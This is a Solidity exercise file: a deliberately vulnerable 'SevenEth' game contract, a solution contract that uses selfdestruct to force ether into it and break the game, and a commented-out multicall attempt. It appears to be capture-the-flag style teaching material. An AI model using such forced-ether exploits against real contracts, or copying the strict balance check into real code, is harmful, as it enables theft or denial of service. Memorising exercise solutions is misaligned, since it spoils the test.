// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;


//Become the 7th person to deposit 1 ETH to win 7 ETH.

// You can deposit 1 ETH at a time.

// Alice and Bob already has 1 ETH deposited.

contract SevenEth {
    function play() external payable {
        require(msg.value == 1 ether, "not 1 ether");

        uint256 bal = address(this).balance;
        require(bal <= 7 ether, "game over");

        if (bal == 7 ether) {
          
            payable(msg.sender).transfer(7 ether);
        }
    }
}
// ========================================================
contract SevenEthExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external payable {
        // write your code here
        selfdestruct(payable(target));
    }
}



// contract MultiCall {
//     function multiCall(address[] calldata targets, bytes[] calldata data, uint quantity)
//         external
//         payable
//         returns (bytes[] memory)
//     {
//         require(targets.length == data.length, "target length != data length");
//         bytes[] memory results = new bytes[](data.length);
//         for (uint i ; i < targets.length ; i++) {
//             (bool success, bytes memory result) = targets[i].call{value: msg.value/ quantity}(data[i]);
//             //staticcall for view/query;
//             //call for sending transactions;
//             require(success, "call failed");
//             results[i] = result;

//         }
//         return results;
//     }
// }

// contract SevenEthExploit is MultiCall {
//     address private immutable target;
//     address[] public targets;
//     bytes[] public datas;

//     constructor(address _target) {
//         target = _target;
//     }

//     function makeTargetsAndDatas() external  {
//         uint quantity = 7 - this.getBalance();
//         for (uint i ; i < quantity  ; i++) {
//             datas.push(abi.encodeWithSelector(SevenEth.play.selector));
//             targets.push(target);
//         }
//     }

//     function teste() external view returns (address[] memory, bytes[] memory) {
//         return (targets, datas);
//     }
    
//     function pwn() external payable {
//         // write your code here
//         uint quantity = 7 - this.getBalance();
//         this.multiCall{value: msg.value}(targets, datas, quantity);
//     }

//     function getBalance() external view returns (uint) {
//         return target.balance / 1 ether;
//     }


// }


